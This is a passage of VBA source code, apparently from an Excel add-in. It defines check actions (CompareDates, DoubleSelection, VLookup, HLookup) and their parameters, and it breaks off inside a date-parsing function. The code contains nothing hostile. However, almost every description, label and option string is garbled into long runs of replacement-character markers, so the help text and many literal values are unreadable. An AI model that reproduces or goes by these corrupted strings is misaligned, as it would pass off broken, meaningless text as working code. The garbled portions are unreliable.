                       "|fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||73b| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "-1 : |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "-2 : |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "-3 : |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "-4 : |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "-5 : |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "-9 : |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 1 |fffd| |fffd||fffd||fffd||fffd| : |fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "Condition", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", ConditionsList, ConditionsList(0)
        .AddParameter "Pattern", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", ConditionalCommandsList, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Parameter", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "UseAnotherValue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|", "tag"), "|fffd||fffd||fffd|"
        .AddParameter "Value", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Check, "CompareDates", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: -1 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|), 0 (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|), 1 (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| {time=DD.MM.YYYY} |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {time+1=DD.MM.YYYY} {time-2=DD.MM.YYYY} |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "PS: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "Date", aps_Combo, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", _
                      Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "{time-2=DD.MM.YYYY}", "{time=DD.MM.YYYY HH:NN:SS}"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "TakeTime", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Check, "DoubleSelection", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", True)
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "(|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1 |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| 3 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| ('|fffd||fffd|' |fffd| '|fffd||fffd||fffd|'), |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Mask1", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 1 (|fffd||fffd||fffd|)"
        .AddParameter "Mask2", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| 2 (|fffd||fffd||fffd||fffd|)"
        .AddParameter "Filters", aps_Combo, "HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, id=content)", Array("class=InStock", "ConvertToText", "div id=content&ConvertToText")
        .AddParameter "ResultValues", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ( |fffd||fffd|||fffd||fffd||fffd|||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| )", _
                      Array("|fffd||fffd|||fffd||fffd||fffd|||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd|||fffd||fffd||fffd|", "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd|||fffd||fffd||fffd|||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Check, "VLookup", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd|() |fffd||fffd| Excel." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|1||fffd||fffd||fffd||fffd||fffd||fffd||fffd|2||fffd||fffd||fffd||fffd||fffd||fffd||fffd|3||fffd||fffd||fffd||fffd||fffd||fffd||fffd|4|fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| 2+ |fffd||fffd||fffd||fffd||fffd||fffd| 2, |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd|||fffd| |fffd|.|fffd|.)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "CheckColumn", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3"), "1"
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, *|fffd||fffd||fffd||fffd||fffd||fffd||fffd|*)"
        .AddParameter "ReturnedColumn", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "3"), "2"
        .AddParameter "Index", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "2+", "3", "4", "5", "last", "last-1"), "1"
    End With

    With AAs.AddAction(fc_Check, "HLookup", "|fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd|)")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| =|fffd||fffd||fffd|() |fffd||fffd| Excel." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|1||fffd||fffd||fffd||fffd||fffd||fffd||fffd|2||fffd||fffd||fffd||fffd||fffd||fffd||fffd|3||fffd||fffd||fffd||fffd||fffd||fffd||fffd|4|fffd|," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "CheckRow", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3"), "1"
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, *|fffd||fffd||fffd||fffd|*)"
        .AddParameter "ReturnedRow", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "3"), "2"
        .AddParameter "AddBeforeFromColumn", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1", "2", "3"), "1"
    End With

End Sub

Function GetDate(ByVal txt$) As Date
    On Error Resume Next
    Dim td$, tt$, word, res, objMatches As Object

    If txt Like "*####-##-##?##:##*" Then    ' DATE_RFC3339
        With REGEXP
            .Global = True
